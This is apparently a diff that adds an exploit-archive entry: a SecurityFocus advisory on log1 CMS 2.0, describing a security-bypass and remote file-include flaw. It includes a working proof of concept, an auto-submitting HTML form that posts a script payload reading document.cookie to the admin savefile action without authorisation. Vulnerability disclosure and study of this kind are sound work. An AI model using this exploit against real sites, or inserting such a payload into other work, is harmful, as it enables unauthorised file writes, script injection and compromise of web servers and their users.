@@ -1,0 +1,9 @@
+source: http://www.securityfocus.com/bid/40636/info
+
+log1 CMS is prone to a security-bypass vulnerability because of a design flaw and a remote file-include vulnerability because it fails to properly sanitize user-supplied input.
+
+An attacker can exploit these issues to gain unauthorized access, obtain potentially sensitive information or to execute arbitrary script code in the context of the webserver process. This may allow the attacker to compromise the application and the computer; other attacks are also possible.
+
+log1 CMS 2.0 is vulnerable; other versions may be affected.
+
+<form action="http://example.com/admin/main.php?action=savefile" method="post" name="main" > <input name="content" type="hidden" value='Some text here..."><script>alert(document.cookie)</script>' /> <input type="hidden" name="filename" value="menupage1_page" /> </form> <script> document.main.submit(); </script> 
